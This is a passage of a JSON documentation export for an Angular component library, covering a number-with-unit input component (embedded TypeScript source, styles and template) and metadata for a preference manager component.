                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "updateErrorState",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 25,
                "deprecated": false,
                "deprecationMessage": "",
                "inheritance": {
                  "file": "FormFieldBase"
                }
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "attr.aria-describedby",
            "defaultValue": "''",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 187,
            "type": "string",
            "decorators": []
          },
          {
            "name": "class.floating",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 166,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "id",
            "defaultValue": "`value-unit-input-${NumberUnitInputComponent.nextId++}`",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 127,
            "type": "string",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  DoCheck,\r\n  ElementRef,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  OnInit,\r\n  Optional,\r\n  Self,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { ControlValueAccessor, FormBuilder, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\r\nimport { MatFormFieldControl } from '@angular/material/form-field';\r\nimport { Subject, Subscription } from 'rxjs';\r\nimport { FocusMonitor } from '@angular/cdk/a11y';\r\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\r\nimport { NumberInputPipe } from '../number-input.pipe';\r\nimport { MatSelect } from '@angular/material/select';\r\nimport { FormFieldBase } from '../../sto-form/form-field.base';\r\nimport { ErrorStateMatcher } from '@angular/material/core';\r\nimport { debounceTime } from 'rxjs/operators';\r\nimport { NumberInputDirective } from '../number-input.directive';\r\n\r\nclass NumberUnit {\r\n  value: number | string;\r\n  unit: string;\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-number-unit-input',\r\n  templateUrl: './number-unit-input.component.html',\r\n  styleUrls: [ './number-unit-input.component.scss' ],\r\n  providers: [\r\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\r\n  ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class NumberUnitInputComponent extends FormFieldBase\r\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\r\n  static nextId = 0;\r\n  stateChanges = new Subject<void>();\r\n  public form: FormGroup;\r\n  readonly autofilled: boolean;\r\n  controlType = 'number-unit-input';\r\n  private numberFormatterPipe = new NumberInputPipe();\r\n  @ViewChild(MatSelect)\r\n  select: MatSelect;\r\n  @ViewChild('input')\r\n  input: ElementRef<HTMLInputElement>;\r\n  @ViewChild(NumberInputDirective)\r\n  numberInputDirective: NumberInputDirective;\r\n\r\n  errorState: boolean;\r\n\r\n  @Input()\r\n  unitOptional = true;\r\n  @Input()\r\n  unitClearText = '(none)';\r\n\r\n  @Input()\r\n  get disabled(): boolean {\r\n    return this._disabled;\r\n  }\r\n\r\n  set disabled(disable: boolean) {\r\n    this._disabled = coerceBooleanProperty(disable);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    disable ? this.form.disable(opts) : this.form.enable(opts);\r\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\r\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _disabled = false;\r\n\r\n  @Input()\r\n  get readonly(): boolean {\r\n    return this._readonly;\r\n  }\r\n\r\n  set readonly(value: boolean) {\r\n    this._readonly = coerceBooleanProperty(value);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _readonly = false;\r\n\r\n  @Input()\r\n  get list() {\r\n    return this._list;\r\n  }\r\n\r\n  set list(value) {\r\n    this._list = value;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _list: { value: unknown; title?: string; }[] = [];\r\n\r\n  @Input()\r\n  get fractionSize() {\r\n    return this._fractionSize || 3;\r\n  }\r\n\r\n  set fractionSize(fractionSize) {\r\n    this._fractionSize = fractionSize;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _fractionSize: number;\r\n\r\n  get empty() {\r\n    const n = this.form.value;\r\n    return !n.value && !n.unit;\r\n  }\r\n\r\n  public focused: boolean;\r\n\r\n\r\n  @HostBinding()\r\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\r\n\r\n  @Input()\r\n  get placeholder() {\r\n    return this._placeholder || '';\r\n  }\r\n\r\n  set placeholder(plh) {\r\n    this._placeholder = plh;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _placeholder: string;\r\n\r\n  @Input()\r\n  get unitPlaceholder() {\r\n    return this._unitPlaceholder || '';\r\n  }\r\n\r\n  set unitPlaceholder(plh) {\r\n    this._unitPlaceholder = plh;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _unitPlaceholder: string;\r\n\r\n  @Input()\r\n  get required() {\r\n    return this._required;\r\n  }\r\n\r\n  set required(req) {\r\n    this._required = coerceBooleanProperty(req);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _required = false;\r\n\r\n  @HostBinding('class.floating')\r\n  get shouldLabelFloat() {\r\n    return this.focused || !this.empty;\r\n  }\r\n\r\n  get value(): NumberUnit | null {\r\n    return this._value;\r\n  }\r\n\r\n  set value(value: NumberUnit | null) {\r\n    if ( value ) {\r\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\r\n      this._value = { ...value, value: parsedValue };\r\n    } else {\r\n      this._value = value;\r\n    }\r\n    this.form.patchValue(this._value || {}, { emitEvent: false });\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _value: NumberUnit | null;\r\n\r\n  @HostBinding('attr.aria-describedby') describedBy = '';\r\n\r\n  public sub = new Subscription();\r\n\r\n\r\n  constructor(@Optional() @Self() public ngControl: NgControl,\r\n              private fm: FocusMonitor,\r\n              private fb: FormBuilder,\r\n              @Optional() _parentForm: NgForm,\r\n              @Optional() _parentFormGroup: FormGroupDirective,\r\n              _defaultErrorStateMatcher: ErrorStateMatcher,\r\n              private elRef: ElementRef<HTMLElement>) {\r\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\r\n    this.form = this.fb.group({\r\n      value: [],\r\n      unit: []\r\n    });\r\n    if ( this.ngControl != null ) {\r\n      this.ngControl.valueAccessor = this;\r\n    }\r\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\r\n      this.focused = !!origin;\r\n      this.stateChanges.next();\r\n    });\r\n  }\r\n\r\n  ngDoCheck(): void {\r\n    if ( this.ngControl ) {\r\n      this.updateErrorState();\r\n    }\r\n  }\r\n\r\n\r\n  ngOnInit(): void {\r\n    const sub = this.form.valueChanges\r\n      .subscribe((value: NumberUnit) => {\r\n        const valueAsString = value.value as string;\r\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\r\n        numberValue = !isNaN(numberValue) ? numberValue : null;\r\n        this.onChange({ ...value, value: numberValue });\r\n      });\r\n\r\n    this.sub.add(this.stateChanges.pipe(debounceTime(50)).subscribe(() => {\r\n      this.numberInputDirective?.setDisplayValue(this.readonly);\r\n    }));\r\n    this.sub.add(sub);\r\n    if ( this.ngControl && this.ngControl.statusChanges ) {\r\n      this.sub.add(this.ngControl.statusChanges\r\n        .subscribe(() => this.updateErrorState())\r\n      );\r\n    }\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.stateChanges.complete();\r\n    this.fm.stopMonitoring(this.elRef.nativeElement);\r\n    this.sub.unsubscribe();\r\n  }\r\n\r\n\r\n  onContainerClick(event: MouseEvent) {\r\n    const rect = this.input.nativeElement.getBoundingClientRect();\r\n    const isInputFocus = rect.right >= event.clientX;\r\n    if ( isInputFocus ) {\r\n      this.elRef.nativeElement.querySelector('input')?.focus();\r\n    } else {\r\n      this.select.focus();\r\n      this.select.open();\r\n    }\r\n  }\r\n\r\n\r\n  setDescribedByIds(ids: string[]) {\r\n    this.describedBy = ids.join(' ');\r\n  }\r\n\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\r\n  onChange = (_: unknown) => {\r\n  }\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\r\n  onTouched = () => {\r\n  }\r\n\r\n  writeValue(value: NumberUnit | null): void {\r\n    this.value = value;\r\n  }\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.onChange = fn;\r\n  }\r\n\r\n  registerOnTouched(fn: never): void {\r\n    this.onTouched = fn;\r\n  }\r\n\r\n  setDisabledState(isDisabled: boolean): void {\r\n    this.disabled = isDisabled;\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".mat-form-field.sto-form__field {\r\n  sto-number-unit-input {\r\n    .number-unit-input-container {\r\n      display: grid;\r\n      grid-template-columns: 20fr 45px;\r\n      grid-column-gap: 8px;\r\n    }\r\n\r\n    .number-unit-input-element {\r\n      border: none;\r\n      background: none;\r\n      padding: 0;\r\n      outline: none;\r\n      font: inherit;\r\n\r\n      .mat-select-placeholder {\r\n        transition: none;\r\n      }\r\n\r\n      .mat-select-value-text span {\r\n        pointer-events: none;\r\n      }\r\n\r\n\r\n    }\r\n\r\n\r\n    &.floating .number-unit-input-spacer {\r\n    }\r\n\r\n    .number-unit-input-spacer {\r\n      height: 44px;\r\n      width: 1px;\r\n      position: absolute;\r\n      right: 55px;\r\n      top: -19px;\r\n    }\r\n  }\r\n\r\n  &:not(.sto-form__field--readonly) {\r\n    .number-unit-input-element {\r\n      &:focus, &:focus .mat-select-placeholder {\r\n        font-weight: bold;\r\n      }\r\n    }\r\n  }\r\n\r\n  &.sto-form__field--readonly {\r\n    .number-unit-input-spacer {\r\n      opacity: 0;\r\n    }\r\n  }\r\n\r\n  &.sto-form__field--readonly {\r\n    .mat-select-arrow {\r\n      opacity: 0;\r\n    }\r\n  }\r\n}\r\n\r\n",
            "styleUrl": "./number-unit-input.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_parentForm",
              "type": "NgForm",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_parentFormGroup",
              "type": "FormGroupDirective",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_defaultErrorStateMatcher",
              "type": "ErrorStateMatcher",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 189,
          "jsdoctags": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_parentForm",
              "type": "NgForm",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_parentFormGroup",
              "type": "FormGroupDirective",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_defaultErrorStateMatcher",
              "type": "ErrorStateMatcher",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "extends": "FormFieldBase",
        "implements": [
          "DoCheck",
          "OnInit",
          "OnDestroy",
          "ControlValueAccessor",
          "MatFormFieldControl"
        ],
        "accessors": {
          "disabled": {
            "name": "disabled",
            "setSignature": {
              "name": "disabled",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "disable",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 69,
              "jsdoctags": [
                {
                  "name": "disable",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "disabled",
              "type": "boolean",
              "returnType": "boolean",
              "line": 65
            }
          },
                "readonly": {
                    "name": "readonly",
                    "setSignature": {
                      "name": "readonly",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 85,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "readonly",
                    "type": "boolean",
                    "returnType": "boolean",
                    "line": 81
                  }
                },
                "list": {
                    "name": "list",
                    "setSignature": {
                      "name": "list",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 99,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "list",
                    "type": "",
                    "returnType": "",
                    "line": 95
                  }
                },
                "fractionSize": {
                    "name": "fractionSize",
                    "setSignature": {
                      "name": "fractionSize",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "fractionSize",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 111,
                      "jsdoctags": [
                        {
                          "name": "fractionSize",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "fractionSize",
                    "type": "",
                    "returnType": "",
                    "line": 107
                  }
                },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                      "line": 118
                    }
                },
                "placeholder": {
                    "name": "placeholder",
                    "setSignature": {
                      "name": "placeholder",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 134,
                      "jsdoctags": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "placeholder",
                    "type": "",
                    "returnType": "",
                    "line": 130
                  }
                },
                "unitPlaceholder": {
                    "name": "unitPlaceholder",
                    "setSignature": {
                      "name": "unitPlaceholder",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 146,
                      "jsdoctags": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "unitPlaceholder",
                    "type": "",
                    "returnType": "",
                    "line": 142
                  }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                      "name": "required",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 158,
                      "jsdoctags": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "required",
                    "type": "",
                    "returnType": "",
                    "line": 154
                  }
                },
          "shouldLabelFloat": {
            "name": "shouldLabelFloat",
            "getSignature": {
              "name": "shouldLabelFloat",
              "type": "",
              "returnType": "",
              "line": 166
            }
          },
          "value": {
            "name": "value",
            "setSignature": {
              "name": "value",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "value",
                  "type": "NumberUnit | null",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 174,
              "jsdoctags": [
                {
                  "name": "value",
                  "type": "NumberUnit | null",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "value",
              "type": "",
              "returnType": "NumberUnit | null",
              "line": 170
            }
          }
        },
        "templateData": "<div [formGroup]=\"form\"\r\n     class=\"number-unit-input-container\">\r\n  <input numberInput\r\n         #input\r\n         class=\"number-unit-input-element number-unit-input-value\"\r\n         (blur)=\"onTouched()\"\r\n         [fractionSize]=\"fractionSize\"\r\n         [unit]=\"select?.triggerValue\"\r\n         [placeholder]=\"placeholder\"\r\n         [appendUnit]=\"readonly\"\r\n         [readonly]=\"readonly\"\r\n         [tabindex]=\"(readonly || disabled) ? -1 : 0\"\r\n         type=\"text\"\r\n         formControlName=\"value\"/>\r\n  <mat-select formControlName=\"unit\"\r\n              [class.cdk-visually-hidden]=\"readonly\"\r\n              (blur)=\"onTouched()\"\r\n              [placeholder]=\"unitPlaceholder\"\r\n              class=\"number-unit-input-element number-unit-input-unit\">\r\n    <mat-option *ngIf=\"form.get('unit')?.value && unitOptional\"\r\n                class=\"sto-option--clear\"\r\n                [value]=\"null\">{{ unitClearText }}\r\n    </mat-option>\r\n    <mat-option *ngFor=\"let el of list\"\r\n                [value]=\"el.value\">\r\n      {{ el.title || el.value }}\r\n    </mat-option>\r\n  </mat-select>\r\n</div>\r\n<span class=\"number-unit-input-spacer\"></span>\r\n"
      },
      {
        "name": "PreferenceManagerComponent",
        "id": "component-PreferenceManagerComponent-b2e7908fc0d69b546f4eb9ed1ad23dfa860ad0f3a24b384980302f94f4439f59f28fe2ffaaff643a36e93b9f92a80ed302bc964d5caa88da0c34633a5654dc76",
        "file": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-preference-manager",
        "styleUrls": [
          "./preference-manager.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./preference-manager.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "activePreferenceId",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nID of the selected preference\n",
            "description": "<p>ID of the selected preference</p>\n",
            "line": 45,
            "type": "string",
            "decorators": []
          },
          {
            "name": "dirty",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf the current preference has been modified\n",
            "description": "<p>If the current preference has been modified</p>\n",
            "line": 55,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "identifierKey",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nThe preference identifier (typically application area).\nIf missing, will be set to null\n",
            "description": "<p>The preference identifier (typically application area).\nIf missing, will be set to null</p>\n",
            "line": 40,
            "type": "string",
            "decorators": []
          },
          {
            "name": "loadingIndicator",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nWhether to show a progress spinner besides the title\n",
            "description": "<p>Whether to show a progress spinner besides the title</p>\n",
            "line": 50,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "placeholder",
            "defaultValue": "'No filter selected'",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nText to display when no preference is selected\n",
            "description": "<p>Text to display when no preference is selected</p>\n",
            "line": 60,
            "type": "string | null",
            "decorators": []
          },
          {
            "name": "preferences",
            "defaultValue": "[]",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nList of the available preferences\n",
            "description": "<p>List of the available preferences</p>\n",
            "line": 34,
            "type": "Preference[]",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "addNewPreference",
            "defaultValue": "new EventEmitter<Preference>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\naddNewPreference emits when the user creates a new preference.\nThis does *not* include the current setup - that needs to be added by the consuming application\n",
            "description": "<p>addNewPreference emits when the user creates a new preference.\nThis does <em>not</em> include the current setup - that needs to be added by the consuming application</p>\n",
            "line": 87,
            "type": "EventEmitter"
          },
          {
            "name": "deletePreference",
            "defaultValue": "new EventEmitter<string>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\ndeletePreference emits when a preference is deleted\n",
            "description": "<p>deletePreference emits when a preference is deleted</p>\n",
            "line": 81,
            "type": "EventEmitter"
          },
          {
            "name": "editPreference",
            "defaultValue": "new EventEmitter<Preference>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\neditPreference emits any changed (existing) preference\n",
            "description": "<p>editPreference emits any changed (existing) preference</p>\n",
            "line": 71,
            "type": "EventEmitter"
          },
          {
            "name": "selectPreference",
            "defaultValue": "new EventEmitter<string>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nselectPreference emits whenever a preference is selected\n",
            "description": "<p>selectPreference emits whenever a preference is selected</p>\n",
            "line": 66,
            "type": "EventEmitter"
          },
          {
            "name": "setDefaultPreference",
            "defaultValue": "new EventEmitter<Preference>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nsetDefaultPreference emits when the user determines a new default preference\n",
            "description": "<p>setDefaultPreference emits when the user determines a new default preference</p>\n",
            "line": 76,
            "type": "EventEmitter"
          },
          {
            "name": "sharePreference",
            "defaultValue": "new EventEmitter<string>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nsharePreference emits when the user clicks the \"share\" button.\nEach application needs to implement this functionality for themselves.\n",
            "description": "<p>sharePreference emits when the user clicks the &quot;share&quot; button.\nEach application needs to implement this functionality for themselves.</p>\n",
            "line": 93,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "changedPreference",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Preference | null",
                "optional": false,
                "description": "",
                "line": 100,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "editIndex",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number | null",
                "optional": false,
                "description": "",
                "line": 99,
                "rawdescription": "\n\n",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "pos": 2568,
                    "end": 2582,
                    "flags": 4227072,
                    "modifierFlagsCache": 0,
                    "transformFlags": 0,
                    "kind": 325,
                    "tagName": {
                      "pos": 2569,
                      "end": 2577,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "internal"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "nameTmpl",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLInputElement>",
                "optional": false,
                "description": "",
                "line": 28,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'nameTmpl'"
                  }
                ]
              },
              {
                "name": "newPreference",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Preference | null",
                "optional": false,
                "description": "",
                "line": 101,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "trigger",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "MatMenuTrigger",
                "optional": false,
                "description": "",
                "line": 26,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "MatMenuTrigger"
                  }
                ],
                "modifierKind": [
                  121
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "addPreference",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 164,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "cancelNewPreference",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 185,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": []
              },
              {
                "name": "cancelRename",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 121,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": []
              },
              {
                "name": "focusActiveItem",
                "args": [
                  {
                    "name": "menu",
                    "type": "MatMenu",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 153,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": [
                  {
                    "name": "menu",
                    "type": "MatMenu",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "openMenu",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 104,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'click'"
                  }
                ]
              },
              {
                "name": "overwrite",
                "args": [
                  {
                    "name": "pref",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 189,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "pref",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "renamePreference",
                "args": [
                  {
                    "name": "preference",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 111,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": [
                  {
                    "name": "preference",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "saveNewPreference",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 172,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": []
              },
              {
                "name": "saveRename",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 129,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": []
              },
              {
                "name": "toggleDefault",
                "args": [
                  {
                    "name": "preference",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 143,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n",
                "description": "",
                "jsdoctags": [
                  {
                    "name": "preference",
                    "type": "Preference",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "click",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 104
          }
        ],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
